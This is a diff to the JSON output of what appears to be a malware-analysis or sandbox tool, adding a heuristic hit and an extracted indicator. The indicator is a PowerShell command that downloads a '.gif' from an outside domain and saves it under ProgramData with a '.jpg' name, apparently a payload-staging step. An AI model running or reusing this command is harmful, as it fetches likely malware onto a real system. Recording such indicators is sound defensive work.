@@ -65,8 +65,22 @@
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
-        "heuristic": null,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\programdata\\PNwK.jpg"
+              ]
+            }
+          },
           "network": {
             "static": {
               "uri": [
@@ -132,6 +146,11 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 10,
         "signatures": [
           "internet_download"
@@ -139,9 +158,16 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\programdata\\PNwK.jpg"
+        }
+      ],
       "network.static.uri": [
         {
-          "heur_id": null,
+          "heur_id": 5,
           "signatures": [],
           "value": "https://ramdungexpedition.com/image/017.gif"
         },
